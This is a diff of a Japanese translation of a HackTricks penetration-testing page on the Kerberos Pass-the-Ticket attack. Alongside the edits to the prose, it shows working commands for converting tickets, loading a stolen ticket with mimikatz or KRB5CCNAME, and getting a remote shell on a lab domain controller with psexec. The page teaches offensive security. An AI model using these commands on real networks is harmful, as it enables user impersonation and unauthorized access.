@@ -1,19 +1,19 @@
-# パス・ザ・チケット
+# Pass the Ticket
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## パス・ザ・チケット (PTT)
+## Pass The Ticket (PTT)
 
-**パス・ザ・チケット (PTT)** 攻撃手法では、攻撃者は **ユーザーの認証チケットを盗む** ことで、パスワードやハッシュ値を盗むのではありません。この盗まれたチケットは、**ユーザーを偽装する** ために使用され、ネットワーク内のリソースやサービスへの不正アクセスを得ることができます。
+**Pass The Ticket (PTT)**攻撃手法では、攻撃者はパスワードやハッシュ値ではなく、**ユーザーの認証チケットを盗みます**。その後、この盗まれたチケットを使用して**ユーザーになりすまし**、ネットワーク内のリソースやサービスへの不正アクセスを取得します。<sup>[[1]](#references)</sup>
 
-**読む**:
+**参照**:
 
 - [Windowsからのチケットの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
 - [Linuxからのチケットの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **プラットフォーム間でのLinuxとWindowsのチケットの交換**
+### **LinuxとWindows間でのチケットの交換**
 
-[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) ツールは、チケット自体と出力ファイルを使用してチケット形式を変換します。
+[**ticket_converter**](https://github.com/Zer1t0/ticket_converter)ツールは、チケット本体と出力ファイルだけを使用してチケット形式を変換します。
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -21,9 +21,9 @@ Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
-Windowsでは[Kekeo](https://github.com/gentilkiwi/kekeo)が使用できます。
+Windowsでは[Kekeo](https://github.com/gentilkiwi/kekeo)を使用できます。
 
-### パス・ザ・チケット攻撃
+### Pass The Ticket Attack
 ```bash:Linux
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
@@ -36,8 +36,8 @@ mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.k
 klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
 ```
-## 参考文献
+## 参考資料
 
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [1] [Kerberos (II): Kerberosを攻撃する方法](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
 {{#include ../../banners/hacktricks-training.md}}
